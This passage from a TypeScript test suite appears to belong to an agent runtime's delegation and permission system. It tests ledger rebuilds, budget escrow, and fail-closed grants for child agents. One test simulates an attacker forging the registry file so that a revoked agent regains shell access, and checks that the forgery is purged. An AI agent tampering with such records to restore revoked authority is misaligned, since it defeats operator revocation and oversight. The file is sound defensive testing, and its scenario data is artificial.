        delegationId: dId,
        childMissionId: makeMisId(171),
        childAgentId: makeAgtId(2),
        childIncarnationEpoch: 1,
        containerId: "c_crash",
        hostPid: 5555,
      },
    });

    ledger.append({
      kind: "delegation.revoked",
      author: "runtime",
      ts: "2026-10-07T12:05:00Z" as Iso8601,
      body: {
        delegationId: dId,
        parentDelegationId: null,
        childMissionId: makeMisId(171),
        revokedAt: "2026-10-07T12:05:00Z" as Iso8601,
        reason: "process crash detected",
        revokedBy: "operator",
      },
    });

    const manager = BudgetEscrowManager.rebuildFromLedger(ledger, DEFAULT_BUDGET);
    const escrow = manager.getEscrow(dId);
    assert(escrow !== undefined);
    assert.equal(escrow.state, "UNCERTAIN");
    assert.equal(escrow.uncertain, true);

    // Attempting direct refund of UNCERTAIN spend throws error
    assert.throws(() => {
      manager.refundUncertainDirectly(dId);
    }, UncertainBudgetRefundError);
  } finally {
    ledger.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});

// ============================================================================
// P2A-018: Delegation registry tampering purged on rebuild
// ============================================================================
test("P2A-018: Delegation registry external tampering in JSON is purged on rebuild from journal", () => {
  const tmp = createTempDir("registry-tamper");
  const mId = makeMisId(180);
  const ledger = new Ledger({ dataDir: tmp, missionId: mId, writer: { pid: process.pid, host: "test" } });
  try {
    const registryPath = join(tmp, "delegation-registry.json");
    const dId = makeDelId(181);

    // Authorized then revoked in canonical journal
    ledger.append({
      kind: "delegation.authorized",
      author: "runtime",
      ts: "2026-10-07T12:00:00Z" as Iso8601,
      body: {
        delegationId: dId,
        parentDelegationId: null,
        parentMissionId: mId,
        childMissionId: makeMisId(181),
        parentAgentId: makeAgtId(1),
        childAgentId: makeAgtId(2),
        depth: 1,
        ancestorPath: [dId],
        grantId: makeGrtId(1),
        grantRevision: 1,
        effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
        effectiveEnvelope: makeEnvelope(),
        budgetEscrow: { ...DEFAULT_BUDGET, maxTokens: 1000 },
        newAvailableTokens: DEFAULT_BUDGET.maxTokens - 1000,
      },
    });
    ledger.append({
      kind: "delegation.revoked",
      author: "runtime",
      ts: "2026-10-07T12:05:00Z" as Iso8601,
      body: {
        delegationId: dId,
        parentDelegationId: null,
        childMissionId: makeMisId(181),
        revokedAt: "2026-10-07T12:05:00Z" as Iso8601,
        reason: "Compromised",
        revokedBy: "operator",
      },
    });

    // Attacker fabricates registry.json marking agent active with shell
    const forgedEntry = makeRegistryEntry({
      delegationId: dId,
      status: "active", // FORGED!
      effectiveEnvelope: makeEnvelope({ capabilities: ["fs", "shell"] }),
    });
    writeFileSync(registryPath, JSON.stringify([forgedEntry], null, 2), "utf8");

    // Rebuild from ledger
    const rebuilt = DelegationRegistry.rebuildFromLedger(ledger, registryPath);
    const entry = rebuilt.getDelegation(dId);

    assert.equal(entry?.status, "revoked");
    assert.equal(entry?.effectiveEnvelope.capabilities.includes("shell"), false);
  } finally {
    ledger.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});

// ============================================================================
// P2A-019: Omitted network hosts constraint fails closed
// ============================================================================
test("P2A-019: Omitted network hosts constraint in child grant fails closed for web_fetch", () => {
  const grant = makeGrant({
    id: makeGrtId(19),
    capability: "web_fetch",
    constraints: {}, // Omitted hosts
  });

  const proposal: Proposal = {
    capability: "web_fetch",
    args: { url: "https://example.com/api" },
  };

  const verdict = evalProposal(proposal, {
    grants: [grant],
  });

  assert.notEqual(verdict.type, "allow");
  assert.equal(verdict.type, "escalate");
});

// ============================================================================
// P2A-020: Omitted capabilities fails closed to empty set
// ============================================================================
test("P2A-020: Omitted capabilities in child request fails closed to empty set", () => {
  const parentEnvelope = makeEnvelope({
    capabilities: ["fs", "http"],
    constraints: { paths: ["workspace"] },
    riskCeiling: "network",
    isolationProfile: "sandboxed",
    allowHostExecution: false,
  });

  const childRequested: ChildRequestedAuthority = {
    // capabilities omitted
    constraints: { paths: ["workspace"] },
  };

  const result = computeEffectiveAuthority(parentEnvelope, childRequested);
  assert.equal(result.ok, true);
  if (result.ok) {
    assert.deepEqual(result.effective.capabilities, []);
  }
});
